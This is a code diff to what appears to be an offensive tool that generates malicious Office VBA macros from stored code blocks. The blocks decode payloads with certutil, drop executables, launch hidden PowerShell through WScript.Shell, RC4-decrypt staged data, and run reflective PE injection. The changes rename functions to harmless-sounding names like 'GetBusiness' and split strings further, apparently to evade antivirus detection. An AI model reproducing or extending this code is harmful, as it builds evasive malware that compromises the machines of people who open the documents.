@@ -182,7 +182,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('CertUtil', 'exec', 
 Sub cutil(code As String)
     Dim x As String
     
-    x = "-----BEG" & "IN CER" & "TIFICATE-----"
+    x = "-----BEG" & "IN CER" & "TIFI" & "CATE-----"
     x = x + vbNewLine
     x = x + code
     x = x + vbNewLine
@@ -192,7 +192,7 @@ Sub cutil(code As String)
     path = Application.UserLibraryPath & GetRnd & ".txt"
     expath = Application.UserLibraryPath & GetRnd & ".exe"
     
-    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
+    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemOb" & "ject")
     Set file = scr.CreateTextFile(path, True)
     file.Write x
     file.Close
@@ -247,7 +247,7 @@ Sub |RANDOMNAME|()
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     x = Replace(x, """", "\""")
     Dim c As String
-    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
+    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle 1 -command " & Chr(34) & x & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
@@ -337,7 +337,7 @@ End Function
 
 --12
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Crypto', 'util', '
-Public Function crc(sText As String, sKey As String) As String
+Public Function crypt(sText As String, sKey As String) As String
     Dim baS(0 To 255) As Byte
     Dim baK(0 To 255) As Byte
     Dim bytSwap     As Byte
@@ -363,31 +363,31 @@ Public Function crc(sText As String, sKey As String) As String
         bytSwap = baS(lI)
         baS(lI) = baS(lJ)
         baS(lJ) = bytSwap
-        crc = crc & Chr$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
+        crypt = crypt & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
     Next
 End Function
 
-Function pvC(ByVal lI As Long, ByVal lJ As Long) As Long
+Function phc(ByVal lI As Long, ByVal lJ As Long) As Long
     If lI = lJ Then
-        pvC = lJ
+        phc = lJ
     Else
-        pvC = lI Xor lJ
+        phc = lI Xor lJ
     End If
 End Function
 
-Public Function thd(sText As String) As String
+Public Function CalcBusiness(sText As String) As String
     Dim lIdx            As Long
 
     For lIdx = 1 To Len(sText)
-        thd = thd & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
+        CalcBusiness = CalcBusiness & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
     Next
 End Function
 
-Public Function fhd(sText As String) As String
+Public Function GetBusiness(sText As String) As String
     Dim lIdx            As Long
 
     For lIdx = 1 To Len(sText) Step 2
-        fhd = fhd & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
+        GetBusiness = GetBusiness & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
     Next
 End Function
 
@@ -410,7 +410,7 @@ Sub |RANDOMNAME|()
     Dim x,k,p As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     k = em()
-    p = crc(fhd(CStr(x)), CStr(k))
+    p = crypt(GetBusiness(CStr(x)), CStr(k))
     p = Replace(p, """", "\""")
     Dim c As String
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(110) & _
@@ -452,8 +452,8 @@ Sub |RANDOMNAME|()
     Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & _
     Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
     ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
-    "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
-    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34)
+    "([System.Text.Enc" & "oding]::Ascii.GetString([System.Convert]:" & _
+    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PE" & "Bytes $b" & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
